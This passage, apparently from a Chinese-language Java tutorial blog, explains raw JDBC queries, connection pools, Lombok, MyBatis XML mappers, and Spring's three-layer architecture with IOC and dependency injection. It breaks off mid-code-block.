java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.注册驱动</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="comment">//2.获取连接</span></span><br><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/mybatis &quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;1234&quot;</span>;</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"><span class="comment">//3.获取执行SQL的对象Statement,执行SQL</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from user&quot;</span>;</span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">List&lt;User&gt; userList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    <span class="type">short</span> <span class="variable">age</span> <span class="operator">=</span> resultSet. getShort(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    <span class="type">short</span> <span class="variable">gender</span> <span class="operator">=</span> resultSet.getShort(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;phone&quot;</span>);</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(id,name,age,gender,phone);</span><br><span class="line">    userList.add(user);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.释放资源</span></span><br><span class="line">statement.close();</span><br><span class="line">connection.close();</span><br></pre></td></tr></table></figure><p>硬编码、挨个提取字段非常复杂</p><h2 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h2><p>数据库连接池是个容器，负责分配、管理数据库连接(Connection)</p><p>它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</p><p>释放空闲时间超过最大空闲时间的连接，来避免因为没有释放连接而引起的数据库连接遗漏</p><p>简单说，就是数据库连接池中存放着所有的数据库连接语句，要用哪个取哪个，不用了就还给连接池，这样就不用每次用同一个查询语句的时候都重复建立数据库连接占用资源</p><h2 id="lombok"><a href="#lombok" class="headerlink" title="lombok"></a>lombok</h2><p>Lombok是一个实用的Java类库，能通过注解的形式自动生成构造器、getter&#x2F;setter、equals、hashcode、toString等方法，并可以自动化生成日志变量，简化java开发、提高效率。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;    </span><br><span class="line">&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;    </span><br><span class="line">&lt;artifactId&gt;lombok&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>比如之前的User类是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">User</span><span class="params">(Integer id, String name, Short age, Short gender, String phone)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">    <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    <span class="built_in">this</span>.phone = phone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Integer <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(Integer id)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Short <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Short age)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Short <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(Short gender)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.gender = gender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPhone</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> phone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPhone</span><span class="params">(String phone)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.phone = phone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">            <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">            <span class="string">&quot;, gender=&quot;</span> + gender +</span><br><span class="line">            <span class="string">&quot;, phone=&#x27;&quot;</span> + phone + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要自己写各种方法</p><p>有了Lombok之后，只需要在类上加上@Data注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"><span class="keyword">private</span> Integer id;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> Short age;</span><br><span class="line"><span class="keyword">private</span> Short gender;</span><br><span class="line"><span class="keyword">private</span> String phone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>注解</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>@Getter&#x2F;@Setter</td><td>为所有的属性提供get&#x2F;set方法</td></tr><tr><td>@ToString</td><td>会给类自动生成易阅读的 toString 方法</td></tr><tr><td>@EqualsAndHashCode</td><td>根据类所拥有的非静态字段自动重写 equals 方法和 hashCode 方法</td></tr><tr><td>@Data</td><td>提供了更综合的生成代码功能（@Getter + @Setter + @ToString + @EqualsAndHashCode）</td></tr><tr><td>@NoArgsConstructor</td><td>为实体类生成无参的构造器方法</td></tr><tr><td>@AllArgsConstructor</td><td>为实体类生成除了static修饰的字段之外带有各参数的构造器方法。</td></tr></tbody></table><h2 id="XML映射文件"><a href="#XML映射文件" class="headerlink" title="XML映射文件"></a>XML映射文件</h2><p>SQL语句可以注解，也可以通过XML配置文件</p><p>XML配置文件规范</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">XML映射文件的名称与Mapper接口名称一致，并且将XML映射文件和Mapper接口放置在相同包下（同包同名）。</span><br><span class="line"></span><br><span class="line">XML映射文件的namespace属性为Mapper接口全限定名一致。</span><br><span class="line"></span><br><span class="line">XML映射文件中sql语句的id与Mapper 接口中的方法名一致，并保持返回类型一致。</span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">EmpMapper</span> &#123;      </span><br><span class="line"><span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">list</span> <span class="params">(String name, Short gender , LocalDate begin , LocalDate end)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//xml配置文件</span></span><br><span class="line"><span class="comment">//resultType指的是封装的单条记录类型</span></span><br><span class="line">&lt;mapper namespace=<span class="string">&quot;itheima&quot;</span>&gt;    </span><br><span class="line">&lt;select id=<span class="string">&quot;abc&quot;</span> resultType=<span class="string">&quot;com.itheima.pojo.Emp&quot;</span>&gt;</span><br><span class="line">    select * from emp where name like <span class="title function_">concat</span><span class="params">(<span class="string">&#x27;%&#x27;</span>,#&#123;name&#125;,<span class="string">&#x27;%&#x27;</span>)</span> <span class="type">and</span> <span class="variable">gender</span> <span class="operator">=</span> #&#123;gender&#125; and entrydate between #&#123;begin&#125; and #&#123;end&#125; order by update_time desc</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">&lt;/mapper&gt;</span><br></pre></td></tr></table></figure><h1 id="三层开发架构"><a href="#三层开发架构" class="headerlink" title="三层开发架构"></a>三层开发架构</h1><h2 id="三层架构概述"><a href="#三层架构概述" class="headerlink" title="三层架构概述"></a>三层架构概述</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">controller：控制层，接收前端发送的请求，对请求进行处理，并响应数据。</span><br><span class="line">service：业务逻辑层，处理具体的业务逻辑。</span><br><span class="line">dao：数据访问层(Data Access Object)（持久层），负责数据访问操作，包括数据的增、删、改、查。</span><br><span class="line">controller接受请求</span><br><span class="line">service调用dao层，dao层获取数据</span><br><span class="line">service层拿到dao层返回的数据交给controller层</span><br><span class="line">controller展示页面</span><br></pre></td></tr></table></figure><h2 id="分层解耦"><a href="#分层解耦" class="headerlink" title="分层解耦"></a>分层解耦</h2><p>简单的三层架构实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//controller层</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">EmpService</span> <span class="variable">empService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EmpServiceA</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 调用service, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empService.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//service层</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">EmpDao</span> <span class="variable">empDao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EmpDaoA</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 调用dao, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empDao.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dao层</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpDaoA</span> <span class="keyword">implements</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码就存在一个问题，如果controller层在调用service层时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">EmpService</span> <span class="variable">empService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EmpServiceA</span>();</span><br></pre></td></tr></table></figure><p>这里的EmpServiceA()如果要换成EmpServiceB()，就需要改这块的代码，这里就产生了controller层和service层的耦合</p><h2 id="耦合问题的解决"><a href="#耦合问题的解决" class="headerlink" title="耦合问题的解决"></a>耦合问题的解决</h2><p>如果能引入一个容器，这个容器里可以存放EmpServiceA的对象，也可以存放EmpServiceB的对象，当controller层需要EmpService实例的时候，就去容器里取，这样就避免了改代码的情况，说白了就是把对象交给容器管理</p><p>将对象放入容器的过程称为控制反转，从容器取出对象的过程成为依赖注入，容器成为IOC容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制反转： Inversion Of Control，简称IOC。对象的创建控制权由程序自身转移到外部（容器），这种思想称为控制反转。</span><br><span class="line">依赖注入： Dependency Injection，简称DI。容器为应用程序提供运行时，所依赖的资源，称之为依赖注入。</span><br><span class="line">Bean对象：IOC容器中创建、管理的对象，称之为bean。</span><br></pre></td></tr></table></figure><h2 id="IOC-DI"><a href="#IOC-DI" class="headerlink" title="IOC&amp;DI"></a>IOC&amp;DI</h2><p>修改之后的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>Service层及Dao层的实现类，交给IOC容器管理。</span><br><span class="line"><span class="number">2.</span>Controller及Service注入运行时，依赖的对象。</span><br><span class="line"><span class="number">3.</span>运行测试。</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"><span class="comment">//Autowired注解表示运行时,需要从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 调用service, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empService.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Component注解表示将当前对象交给IOC容器管理,成为IOC容器的bean</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line"><span class="comment">//Autowired注解表示运行时,需要从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> EmpDao empDao ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 调用dao, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empDao.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Component表示将当前对象交给IOC容器管理,成为IOC容器的bean</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpDaoA</span> <span class="keyword">implements</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样在切换EmpServiceA为EmpServiceB时，只需要将EmpServiceA中的@Component注解注释掉，然后在EmpServiceB中加上@Component</p><h2 id="IOC详解"><a href="#IOC详解" class="headerlink" title="IOC详解"></a>IOC详解</h2><p>IOC容器中的对象又叫Bean对象</p><p>要把某个对象交给IOC容器管理，需要在对应的类上加上如下注解之一：</p><table><thead><tr><th>注解</th><th>说明</th><th>位置</th></tr></thead><tbody><tr><td>@Component</td><td>声明bean的基础注解</td><td>不属于以下三类时，用此注解</td></tr><tr><td>@Controller</td><td>@Component的衍生注解</td><td>标注在控制器类上</td></tr><tr><td>@Service</td><td>@Component的衍生注解</td><td>标注在业务类上</td></tr><tr><td>@Repository</td><td>@Component的衍生注解</td><td>标注在数据访问类上（由于与mybatis整合，用的少）</td></tr></tbody></table><p>声明bean的时候，可以通过value属性指定bean的名字，如果没有指定，默认为类名首字母小写。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Service(value = &quot;test&quot;)</span><br></pre></td></tr></table></figure><p>使用以上四个注解都可以声明bean，但是在springboot集成web开发中，声明控制器bean只能用@Controller。</p><p>前面声明bean的四大注解，要想生效，还需要被组件扫描注解@ComponentScan扫描。</p><p>@ComponentScan注解虽然没有显式配置，但是实际上已经包含在了启动类声明注解 @SpringBootApplication 中，默认扫描的范围是启动类所在包及其子包，如果有类不在这个范围内，是无法放到容器中的。</p><h2 id="DI详解"><a href="#DI详解" class="headerlink" title="DI详解"></a>DI详解</h2><p>@Autowired注解，默认是按照类型进行，如果存在多个相同类型的bean，将会报错。</p><p>如果EmpServiceA和EmpServiceB都被放到容器中，那么需要通过以下几种方案来指定注入的对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 